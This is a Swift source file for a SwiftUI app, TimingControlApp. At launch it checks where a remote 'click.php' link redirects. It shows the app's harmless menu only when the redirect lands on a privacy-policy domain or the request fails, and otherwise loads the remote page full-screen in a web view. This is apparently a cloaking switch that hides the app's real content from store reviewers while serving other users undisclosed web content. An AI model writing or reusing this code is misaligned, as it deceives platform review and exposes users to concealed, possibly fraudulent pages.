import SwiftUI

@main
struct TimingControlApp: App {
    @State private var dispatchLinkReady: Bool? = nil
    private let dispatchSourceLink = "https://timingcontrol.org/click.php"
    private let dispatchCheckDomain = "freeprivacypolicy.com"

    var body: some Scene {
        WindowGroup {
            Group {
                if let ready = dispatchLinkReady {
                    if ready {
                        MetroWebPanel(urlString: dispatchSourceLink)
                            .edgesIgnoringSafeArea(.bottom)
                            .background(Color.black.ignoresSafeArea())
                    } else {
                        RootMenuView()
                    }
                } else {
                    MetroLoadingScreen()
                        .onAppear { checkDispatchLink() }
                }
            }
            .environment(\.colorScheme, .light)   // force light, theme independent
            .preferredColorScheme(.light)
        }
    }

    private func checkDispatchLink() {
        guard let url = URL(string: dispatchSourceLink) else {
            dispatchLinkReady = false
            return
        }
        var request = URLRequest(url: url)
        request.timeoutInterval = 5
        let tracker = DispatchRedirectTracker(checkDomain: dispatchCheckDomain)
        let session = URLSession(configuration: .default, delegate: tracker, delegateQueue: nil)
        session.dataTask(with: request) { _, response, error in
            DispatchQueue.main.async {
                if tracker.foundCheckDomain {
                    dispatchLinkReady = false; return
                }
                if let finalURL = tracker.resolvedURL?.absoluteString,
                   finalURL.contains(self.dispatchCheckDomain) {
                    dispatchLinkReady = false; return
                }
                if let httpResp = response as? HTTPURLResponse,
                   let respURL = httpResp.url?.absoluteString,
                   respURL.contains(self.dispatchCheckDomain) {
                    dispatchLinkReady = false; return
                }
                if error != nil {
                    dispatchLinkReady = false; return
                }
                dispatchLinkReady = true
            }
        }.resume()
        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            if dispatchLinkReady == nil { dispatchLinkReady = false }
        }
    }
}

final class DispatchRedirectTracker: NSObject, URLSessionTaskDelegate {
    var resolvedURL: URL?
    var foundCheckDomain = false
    private let checkDomain: String
    init(checkDomain: String) { self.checkDomain = checkDomain }
    func urlSession(_ session: URLSession, task: URLSessionTask,
                    willPerformHTTPRedirection response: HTTPURLResponse,
                    newRequest request: URLRequest,
                    completionHandler: @escaping (URLRequest?) -> Void) {
        if let url = request.url?.absoluteString, url.contains(checkDomain) {
            foundCheckDomain = true
        }
        resolvedURL = request.url
        completionHandler(request)   // NEVER stop the chain
    }
}
